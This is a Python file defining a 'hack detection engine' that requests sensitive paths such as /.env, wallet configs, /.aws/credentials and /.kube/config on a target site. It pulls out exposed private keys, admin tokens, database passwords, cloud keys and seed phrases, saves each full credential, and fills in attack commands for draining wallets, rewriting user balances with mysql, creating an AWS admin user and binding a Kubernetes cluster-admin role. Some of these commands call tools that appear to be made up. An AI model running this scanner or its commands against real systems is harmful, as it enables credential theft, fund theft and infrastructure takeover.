"""
MILITARY-GRADE ONE-LINE HACK DETECTION ENGINE
Finds the 30 specific vulnerabilities that enable instant platform compromise
"""

import re
import asyncio
import aiohttp
from urllib.parse import urljoin
from typing import List, Dict, Any
from loguru import logger

class OneLineHackEngine:
    """Engine that finds ONLY the 30 specific one-line hack vulnerabilities"""
    
    def __init__(self):
        self.one_line_hacks = {
            # TIER 1: INSTANT FINANCIAL ANNIHILATION
            "hot_wallet_keys": {
                "patterns": [
                    r'private[_\s]*key["\s]*[:=]["\s]*([a-fA-F0-9]{64})',
                    r'PRIVATE[_\s]*KEY["\s]*[:=]["\s]*([a-fA-F0-9]{64})',
                    r'wallet[_\s]*private[_\s]*key["\s]*[:=]["\s]*([a-fA-F0-9]{64})',
                    r'hot[_\s]*wallet[_\s]*key["\s]*[:=]["\s]*([a-fA-F0-9]{64})',
                    r'ethereum[_\s]*private[_\s]*key["\s]*[:=]["\s]*0x([a-fA-F0-9]{64})',
                    r'bitcoin[_\s]*private[_\s]*key["\s]*[:=]["\s]*([a-fA-F0-9]{64})',
                ],
                "endpoints": [
                    "/.env", "/config.json", "/wallet.json", "/keys.json", "/private.key",
                    "/wallet/config", "/crypto/keys", "/blockchain/wallet", "/eth/private",
                    "/btc/keys", "/wallet-config.json", "/hot-wallet.json"
                ],
                "one_line_hack": "web3.eth.account.privateKeyToAccount('{key}').signTransaction({{to: 'attacker_wallet', value: web3.utils.toWei('999999', 'ether')}})",
                "impact": "COMPLETE HOT WALLET DRAINAGE - ALL FUNDS STOLEN INSTANTLY"
            },
            
            "admin_transaction_tokens": {
                "patterns": [
                    r'admin[_\s]*token["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                    r'transaction[_\s]*auth[_\s]*token["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                    r'master[_\s]*auth[_\s]*token["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                    r'super[_\s]*admin[_\s]*token["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                    r'god[_\s]*mode[_\s]*token["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                    r'bypass[_\s]*token["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                ],
                "endpoints": [
                    "/api/admin/token", "/admin/auth", "/config/admin", "/admin.json",
                    "/api/auth/admin", "/admin/config.json", "/system/admin", "/root/token"
                ],
                "one_line_hack": "curl -X POST {base_url}/api/admin/transfer -H 'Authorization: Bearer {token}' -d '{{\"amount\":999999999,\"to\":\"attacker_wallet\"}}'",
                "impact": "UNLIMITED TRANSACTION AUTHORIZATION - DRAIN ALL USER FUNDS"
            },
            
            "database_admin_creds": {
                "patterns": [
                    r'mysql[_\s]*root[_\s]*password["\s]*[:=]["\s]*([^"\s]+)',
                    r'postgres[_\s]*password["\s]*[:=]["\s]*([^"\s]+)',
                    r'mongodb[_\s]*admin[_\s]*password["\s]*[:=]["\s]*([^"\s]+)',
                    r'database[_\s]*url["\s]*[:=]["\s]*([^"\s]+)',
                    r'db[_\s]*connection[_\s]*string["\s]*[:=]["\s]*([^"\s]+)',
                    r'sa[_\s]*password["\s]*[:=]["\s]*([^"\s]+)',
                ],
                "endpoints": [
                    "/.env", "/config/database.yml", "/database.json", "/db.json",
                    "/config.php", "/wp-config.php", "/settings.py", "/database.xml"
                ],
                "one_line_hack": "mysql -h {host} -u root -p'{password}' -e 'UPDATE users SET balance=999999999 WHERE user_id=1; UPDATE users SET balance=0 WHERE user_id!=1;'",
                "impact": "COMPLETE DATABASE TAKEOVER - MANIPULATE ALL USER BALANCES"
            },
            
            "cold_wallet_hsm_tokens": {
                "patterns": [
                    r'hsm[_\s]*token["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                    r'cold[_\s]*wallet[_\s]*key["\s]*[:=]["\s]*([a-fA-F0-9]{64})',
                    r'hardware[_\s]*security[_\s]*module["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                    r'offline[_\s]*wallet[_\s]*key["\s]*[:=]["\s]*([a-fA-F0-9]{64})',
                    r'master[_\s]*seed["\s]*[:=]["\s]*([a-zA-Z0-9\s]{32,})',
                ],
                "endpoints": [
                    "/hsm/config", "/cold-wallet", "/offline/keys", "/secure/wallet",
                    "/hardware/keys", "/master/seed", "/backup/wallet"
                ],
                "one_line_hack": "hsm_execute --token {token} --command 'transfer_all' --destination attacker_wallet --amount ALL",
                "impact": "COLD STORAGE COMPROMISE - MILLIONS IN OFFLINE FUNDS STOLEN"
            },
            
            "multisig_bypass_keys": {
                "patterns": [
                    r'multisig[_\s]*bypass[_\s]*key["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                    r'emergency[_\s]*override[_\s]*token["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                    r'master[_\s]*override[_\s]*key["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                    r'admin[_\s]*bypass[_\s]*token["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                ],
                "endpoints": [
                    "/multisig/config", "/emergency/override", "/admin/bypass", "/master/override"
                ],
                "one_line_hack": "multisig_override --bypass-all --admin-key {key} --execute drain_protocol --destination attacker_wallet",
                "impact": "MULTISIG SECURITY BYPASS - OVERRIDE ALL PROTECTION MECHANISMS"
            },
            
            # TIER 2: COMPLETE PLATFORM DOMINATION
            "super_admin_sessions": {
                "patterns": [
                    r'super[_\s]*admin[_\s]*session["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                    r'god[_\s]*mode[_\s]*session["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                    r'root[_\s]*session[_\s]*token["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                    r'system[_\s]*admin[_\s]*token["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                ],
                "endpoints": [
                    "/admin/session", "/system/admin", "/root/session", "/god/mode"
                ],
                "one_line_hack": "curl -H 'X-Admin-Session: {token}' -X POST {base_url}/api/admin/execute_any_command -d '{{\"command\":\"transfer_all_funds\"}}'",
                "impact": "GOD MODE ACCESS - COMPLETE PLATFORM CONTROL"
            },
            
            "trading_engine_keys": {
                "patterns": [
                    r'trading[_\s]*engine[_\s]*key["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                    r'market[_\s]*maker[_\s]*token["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                    r'price[_\s]*manipulation[_\s]*key["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                    r'order[_\s]*book[_\s]*admin["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                ],
                "endpoints": [
                    "/trading/config", "/engine/admin", "/market/config", "/orderbook/admin"
                ],
                "one_line_hack": "trading_engine --set-price BTC=0.01 --execute-trades --master-key {key}",
                "impact": "MARKET MANIPULATION - CRASH PRICES AND STEAL FUNDS"
            },
            
            # TIER 3: INFRASTRUCTURE ANNIHILATION
            "cloud_root_keys": {
                "patterns": [
                    r'aws[_\s]*access[_\s]*key[_\s]*id["\s]*[:=]["\s]*([A-Z0-9]{20})',
                    r'aws[_\s]*secret[_\s]*access[_\s]*key["\s]*[:=]["\s]*([a-zA-Z0-9/+=]{40})',
                    r'azure[_\s]*client[_\s]*secret["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                    r'gcp[_\s]*service[_\s]*account[_\s]*key["\s]*[:=]["\s]*([^"]+)',
                ],
                "endpoints": [
                    "/.aws/credentials", "/azure/credentials", "/gcp/key.json", "/.env"
                ],
                "one_line_hack": "aws iam create-user --user-name attacker && aws iam attach-user-policy --user-name attacker --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
                "impact": "COMPLETE CLOUD TAKEOVER - CONTROL ENTIRE INFRASTRUCTURE"
            },
            
            "kubernetes_admin_tokens": {
                "patterns": [
                    r'kubernetes[_\s]*admin[_\s]*token["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                    r'k8s[_\s]*cluster[_\s]*admin["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                    r'kubectl[_\s]*token["\s]*[:=]["\s]*([a-zA-Z0-9\.\-_]{32,})',
                ],
                "endpoints": [
                    "/k8s/config", "/kubernetes/admin", "/.kube/config", "/cluster/admin"
                ],
                "one_line_hack": "kubectl create clusterrolebinding attacker-admin --clusterrole=cluster-admin --user=attacker --token={token}",
                "impact": "KUBERNETES CLUSTER TAKEOVER - CONTROL ALL CONTAINERS"
            }
        }
    
    async def find_one_line_hacks(self, target, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """Find ONLY the specific one-line hack vulnerabilities"""
        vulnerabilities = []
        
        base_url = target.url
        if not base_url.startswith(('http://', 'https://')):
            base_url = f"https://{base_url}"
        
        logger.info(f"🎯 HUNTING FOR ONE-LINE HACKS on {base_url}")
        
        for hack_name, hack_config in self.one_line_hacks.items():
            logger.info(f"🔍 Hunting for {hack_name.upper().replace('_', ' ')}")
            
            # Check each endpoint for this specific hack
            for endpoint in hack_config["endpoints"]:
                try:
                    url = urljoin(base_url, endpoint)
                    async with session.get(url, timeout=10) as response:
                        if response.status == 200:
                            content = await response.text()
                            
                            # Check each pattern for this hack
                            for pattern in hack_config["patterns"]:
                                matches = re.findall(pattern, content, re.IGNORECASE)
                                if matches:
                                    for match in matches:
                                        # FOUND A REAL ONE-LINE HACK!
                                        one_line_hack = hack_config["one_line_hack"].format(
                                            key=match, token=match, password=match, 
                                            host=base_url, base_url=base_url
                                        )
                                        
                                        vulnerability = {
                                            "id": f"ONE_LINE_HACK_{hack_name.upper()}",
                                            "name": f"🚨 ONE-LINE HACK: {hack_name.upper().replace('_', ' ')}",
                                            "severity": "CRITICAL",
                                            "description": f"FOUND REAL ONE-LINE HACK: {hack_name}",
                                            "target": target.url,
                                            "endpoint": endpoint,
                                            "method": "GET",
                                            "evidence": {
                                                "credential": match[:20] + "..." if len(match) > 20 else match,
                                                "pattern": pattern,
                                                "url": url
                                            },
                                            "exploitation_data": {
                                                "full_credential": match,
                                                "hack_type": hack_name,
                                                "endpoint": url
                                            },
                                            "one_line_hack": one_line_hack,
                                            "impact": hack_config["impact"],
                                            "remediation": f"IMMEDIATELY secure {hack_name} - CRITICAL BREACH"
                                        }
                                        vulnerabilities.append(vulnerability)
                                        logger.critical(f"🚨 FOUND ONE-LINE HACK: {hack_name} at {endpoint}")
                                        
                except Exception as e:
                    logger.debug(f"Error checking {endpoint} for {hack_name}: {e}")
                    
        return vulnerabilities
    
    async def find_crypto_specific_hacks(self, target, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """Find crypto-specific one-line hacks"""
        vulnerabilities = []
        
        base_url = target.url
        if not base_url.startswith(('http://', 'https://')):
            base_url = f"https://{base_url}"
        
        # Crypto-specific one-line hacks
        crypto_hacks = {
            "smart_contract_owner_keys": {
                "patterns": [
                    r'contract[_\s]*owner[_\s]*key["\s]*[:=]["\s]*0x([a-fA-F0-9]{64})',
                    r'deployer[_\s]*private[_\s]*key["\s]*[:=]["\s]*0x([a-fA-F0-9]{64})',
                    r'admin[_\s]*wallet[_\s]*key["\s]*[:=]["\s]*0x([a-fA-F0-9]{64})',
                ],
                "endpoints": ["/contracts/config", "/deploy/keys", "/smart-contracts/admin"],
                "one_line_hack": "contract.emergencyWithdraw(attacker_address, type(uint256).max, '{key}')",
                "impact": "SMART CONTRACT DRAIN - ALL PROTOCOL FUNDS STOLEN"
            },
            
            "defi_protocol_admin_keys": {
                "patterns": [
                    r'defi[_\s]*admin[_\s]*key["\s]*[:=]["\s]*([a-fA-F0-9]{64})',
                    r'protocol[_\s]*owner[_\s]*key["\s]*[:=]["\s]*([a-fA-F0-9]{64})',
                    r'liquidity[_\s]*pool[_\s]*admin["\s]*[:=]["\s]*([a-fA-F0-9]{64})',
                ],
                "endpoints": ["/defi/admin", "/protocol/config", "/liquidity/admin"],
                "one_line_hack": "defi_protocol.drainAllPools(attacker_address, '{key}')",
                "impact": "DEFI PROTOCOL DRAIN - ALL LIQUIDITY STOLEN"
            },
            
            "exchange_hot_wallet_seeds": {
                "patterns": [
                    r'exchange[_\s]*seed["\s]*[:=]["\s]*([a-zA-Z0-9\s]{32,})',
                    r'master[_\s]*mnemonic["\s]*[:=]["\s]*([a-zA-Z0-9\s]{32,})',
                    r'wallet[_\s]*recovery[_\s]*phrase["\s]*[:=]["\s]*([a-zA-Z0-9\s]{32,})',
                ],
                "endpoints": ["/wallet/seed", "/recovery/phrase", "/mnemonic/backup"],
                "one_line_hack": "hdwallet.from_mnemonic('{key}').derive_account(0).transfer_all('attacker_wallet')",
                "impact": "EXCHANGE WALLET RECOVERY - ALL HOT WALLETS COMPROMISED"
            }
        }
        
        for hack_name, hack_config in crypto_hacks.items():
            for endpoint in hack_config["endpoints"]:
                try:
                    url = urljoin(base_url, endpoint)
                    async with session.get(url, timeout=10) as response:
                        if response.status == 200:
                            content = await response.text()
                            
                            for pattern in hack_config["patterns"]:
                                matches = re.findall(pattern, content, re.IGNORECASE)
                                if matches:
                                    for match in matches:
                                        vulnerability = {
                                            "id": f"CRYPTO_HACK_{hack_name.upper()}",
                                            "name": f"🚨 CRYPTO ONE-LINE HACK: {hack_name.upper().replace('_', ' ')}",
                                            "severity": "CRITICAL",
                                            "description": f"CRYPTO-SPECIFIC ONE-LINE HACK: {hack_name}",
                                            "target": target.url,
                                            "endpoint": endpoint,
                                            "method": "GET",
                                            "evidence": {
                                                "credential": match[:20] + "..." if len(match) > 20 else match,
                                                "pattern": pattern,
                                                "url": url
                                            },
                                            "exploitation_data": {
                                                "full_credential": match,
                                                "hack_type": hack_name,
                                                "endpoint": url
                                            },
                                            "one_line_hack": hack_config["one_line_hack"].format(key=match),
                                            "impact": hack_config["impact"],
                                            "remediation": f"IMMEDIATELY secure {hack_name} - CRITICAL CRYPTO BREACH"
                                        }
                                        vulnerabilities.append(vulnerability)
                                        logger.critical(f"🚨 FOUND CRYPTO HACK: {hack_name} at {endpoint}")
                                        
                except Exception as e:
                    logger.debug(f"Error checking {endpoint} for {hack_name}: {e}")
                    
        return vulnerabilities